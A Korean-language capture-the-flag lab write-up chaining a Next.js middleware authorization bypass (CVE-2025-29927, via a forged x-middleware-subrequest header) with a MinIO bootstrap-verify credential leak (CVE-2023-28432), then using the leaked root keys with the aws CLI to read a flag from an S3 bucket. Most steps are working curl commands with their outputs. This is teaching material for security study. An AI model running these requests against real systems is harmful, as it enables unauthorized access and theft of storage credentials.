01

루트 경로(/) 확인

서비스 조사 — 무엇이 응답하고 있는가

생각. 화면에 버튼 하나 없이 텅 비어 있었다. 뭘 눌러야 할지 찾는 대신, 가장 기본으로 돌아가 이 서버가 정확히 뭘로 응답하는지부터 확인하기로 했다.

zsh — curl 
➜ curl -s -i https://lab.security-wave.kro.kr/
HTTP/2 200
server: nginx
content-type: application/json

{"service":"control-portal","status":"online"}
lab.security-wave.kro.kr

curl 결과와 브라우저 실접속 화면이 동일 — 이 사이트엔 렌더링된 화면 자체가 없다는 게 이 시점에 이미 의심됨.

의미

content-type: application/json은 이게 사람이 보는 HTML 페이지가 아니라 API 응답이라는 뜻이다. "service":"control-portal"이라는 이름은 뒤에 나올 "저장소(storage)" 단서와 이어질 단초였다.

02

존재하지 않는 경로로 기술스택 특정

서비스 조사 — 에러 페이지가 흘리는 정보

생각. 없는 경로에 요청을 보내면 프레임워크마다 특징적인 에러 페이지를 돌려준다. robots.txt는 있으면 힌트, 없어도 에러 페이지 구조를 볼 수 있는 저비용 시도였다.

zsh — curl 
➜ curl -s -i https://lab.security-wave.kro.kr/robots.txt
HTTP/2 404
server: nginx

<title>404: This page could not be found</title>
<script src="/_next/static/chunks/main-4c9cae3348655e81.js"></script>
<script src="/_next/static/5oS3tYmhtJlBfJ0jOLFlb/_buildManifest.js"></script>
...
"buildId":"5oS3tYmhtJlBfJ0jOLFlb","nextExport":true

의미

/_next/static/... 경로 패턴은 Next.js에서만 나타난다 — 강사님 힌트 "Next.js"가 여기서 사실로 확정됐다. 노출된 buildId는 다음 단계로 가는 열쇠이고, nextExport:true는 이 앱이 서버 로직 없는 정적 export라는 뜻이다.

03

빌드 매니페스트로 실제 페이지 목록 확인

서비스 조사 — 화면이 정말 존재하는가

생각. buildId를 손에 넣었으니, Next.js가 공개적으로 제공하는 "이 빌드에 어떤 페이지가 포함됐는지" 목록 파일을 읽어보기로 했다.

zsh — curl 
➜ curl -s https://lab.security-wave.kro.kr/_next/static/5oS3tYmhtJlBfJ0jOLFlb/_buildManifest.js
self.__BUILD_MANIFEST = {
  ...
  sortedPages: ["/_app", "/_error"]
}

의미

실제로 빌드된 화면은 Next.js가 자동 생성하는 내부용 페이지 두 개뿐 — 사람이 보고 클릭할 화면이 이 사이트엔 없다. 그렇다면 "인증 우회" 대상은 로그인 폼이 아니라 API 경로이고, 그 경로 이름은 브라우저에 내려가는 JS 코드 안에 있을 거라는 추론으로 이어졌다.

04

클라이언트 JS 코드에서 숨은 API 경로 찾기

핵심 전환점 — 추측을 멈추고 코드를 읽다

생각. /admin, /dashboard 같은 경로 이름 추측은 비효율적이고 사실상 무작위 스캔에 가깝다. 대신 브라우저가 실행하는 JS 파일은 누구나 다운로드할 수 있는 공개 파일이므로, 그 안에서 실제 경로 문자열을 찾기로 했다.

zsh — curl · grep 
➜ curl -s .../main-4c9cae3348655e81.js -o main.js
➜ grep -oE "/api/[a-zA-Z0-9/_-]*" main.js | sort -u
/api/
/api/admin/storage

의미

/api/admin/storage 발견. "admin"(관리자), "storage"(저장소)라는 이름이 강사님이 준 흐름의 뒷부분("저장소 취약점 분석")과 정확히 이어진다는 걸 보고 이게 핵심 경로라는 확신이 섰다.

05

보호 여부 확인

인증 우회 준비 — 정말 막혀 있는가

생각. 우회를 시도하기 전에, 이 경로가 진짜 인증을 요구하는지부터 실제 요청으로 확인해야 다음 단계가 의미 있어진다.

zsh — curl 
➜ curl -s -i https://lab.security-wave.kro.kr/api/admin/storage

401administrator session required

의미

확실히 보호돼 있다. 이 사이트가 Next.js라는 걸 이미 알고 있었으므로, 이런 경로별 인증 체크는 보통 middleware.ts가 담당한다는 지식을 떠올리고, 최근 알려진 Next.js 미들웨어 취약점(CVE-2025-29927)을 시도해보기로 했다.

06

Next.js 미들웨어 인증 우회

CVE-2025-29927 · Middleware Authorization Bypass

원리. Next.js는 미들웨어가 자기 자신을 무한 재귀 호출하지 않도록, 요청에 x-middleware-subrequest 헤더가 이미 있으면 "이미 미들웨어를 거친 요청"으로 착각해 미들웨어 실행 자체를 건너뛴다. 이 헤더는 클라이언트가 임의로 만들어 보낼 수 있는 일반 헤더다.

zsh — curl 
➜ curl -s -i \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  https://lab.security-wave.kro.kr/api/admin/storage

200storage review authorized

x-lab-minio-path:   /minio/bootstrap/v1/verify
x-lab-s3-bucket:    lab-final
x-lab-ticket:       b5e7ff6b…8bc6b918

의미

헤더 하나로 401 → 200. 인증 검사 자체가 실행되지 않았다. 응답에는 단순 통과 표시가 아니라 다음 단계 지시사항이 그대로 실려 있었다 — MinIO 검증 경로, 티켓, 대상 버킷명. "다음 단계 정보 획득"이 같은 요청 안에서 자동으로 이뤄졌다.

07

MinIO Bootstrap Verify — Credential 노출

CVE-2023-28432 · MinIO Information Disclosure

원리. MinIO 클러스터 노드끼리 설정이 같은지 확인하는 내부용 API가 /minio/bootstrap/v1/verify다. 특정 버전대는 이 API가 외부에서 인증 없이 호출돼도 서버 환경변수 전체를 그대로 반환한다.

zsh — curl 
➜ curl -s -i -X POST .../minio/bootstrap/v1/verify \
  -H "x-lab-ticket: b5e7ff6b…8bc6b918" -d '{}'

200

"MinioEnv": {
  "MINIO_ROOT_USER":     "lab0ed030c5d2039adf",
  "MINIO_ROOT_PASSWORD": "8fa0d0eb…7fc5dd27"
}

의미

MinIO 클러스터의 최고 관리자 Access Key / Secret Key가 평문으로 노출됐다. "저장소 취약점 분석"과 "Credential 획득"이 이 한 번의 요청으로 동시에 이뤄졌다.

08

S3 API 접근 도구 준비

S3 객체 조사 — SigV4 서명 도구 설치

생각. S3 API는 단순 아이디/비번이 아니라 AWS Signature V4라는 서명 규칙을 요구한다. 직접 구현하는 대신 공식 aws CLI를 쓰기로 했다.

zsh — brew 
➜ aws --version
zsh: command not found: aws

➜ brew install awscli
...

➜ aws --version
aws-cli/2.36.23 Python/3.14.7 Darwin/24.6.0 source/arm64

의미

aws CLI는 로그인 도구가 아니라, 환경변수에 등록한 키로 매 요청마다 서명을 자동 생성해주는 클라이언트다.

09

Credential 등록 및 버킷 목록 조회

S3 객체 조사

zsh — aws s3 
➜ export AWS_ACCESS_KEY_ID=lab0ed030c5d2039adf
➜ export AWS_SECRET_ACCESS_KEY=8fa0d0eb…7fc5dd27
➜ aws --endpoint-url https://lab.security-wave.kro.kr s3 ls s3://lab-final --recursive
2026-08-14 10:07:54    78  README.txt
2026-08-14 10:07:54    68  archive/decoy.json
2026-08-14 10:07:54   108  evidence/final.json

의미

요청이 성공했다는 것 자체가 노출된 credential이 진짜 유효했다는 증명이다. 파일명만 봐도 성격이 갈린다 — decoy(미끼)와 final(최종)이 한 버킷 안에 나란히 있다.

10

파일 3개 확인 및 최종 Flag

최종 Flag 획득

생각. 이름만 보고 예단하면 함정(decoy)에 속을 수 있으므로 세 파일 모두 열어봤다.

zsh — aws s3 cp 
➜ aws ... s3 cp s3://lab-final/README.txt -
Control Storage Review
The evidence object is not stored at the bucket root.

➜ aws ... s3 cp s3://lab-final/archive/decoy.json -
{"status":"archived","flag":"FLAG{not_the_final_evidence}"}

➜ aws ... s3 cp s3://lab-final/evidence/final.json -
{"flag":"FLAG{aa5b51c2cc3f56a7ac44cedf04eceef4}","scope":"isolated-lab","proof":"s3-read-only"}

의미

README.txt가 "루트에 없다"고 미리 알려줬고, decoy.json은 이름과 힌트 둘 다 "가짜"라고 경고했다. evidence/final.json의 proof: "s3-read-only"는 서버 스스로가 "S3 읽기 권한 접근에 성공했다"를 확인해주는 자체 증명이었다.

Final Flag FLAG{aa5b51c2cc3f56a7ac44cedf04eceef4}

사용된 취약점

CVE-2025-29927

Next.js Middleware Authorization Bypass

x-middleware-subrequest 헤더로 self-hosted 배포에서 미들웨어 실행 자체를 건너뛸 수 있는 취약점.

CVE-2023-28432

MinIO Information Disclosure

/minio/bootstrap/v1/verify가 인증 없이 클러스터 노드의 환경변수 전체를 반환하는 취약점.

전체를 관통하는 패턴

단계겉으로 보이는 문제실제 원리
정찰화면이 텅 비어 있음404 페이지·클라이언트 JS 등 공개 부산물에서 정보 획득
인증 우회/api/admin/storage 401미들웨어의 재귀 방지 예외를 거꾸로 이용
저장소 취약점별도 로그인 필요노드 간 내부 통신용 API가 외부에도 열려 있음
최종 접근S3는 서명이 필요노출된 키로 SigV4 서명을 직접 생성

세 취약점 모두 공통점이 있다 — "원래 시스템끼리만 주고받으려던 내부 통로가 외부에서도 똑같이 호출 가능했다"는 것.
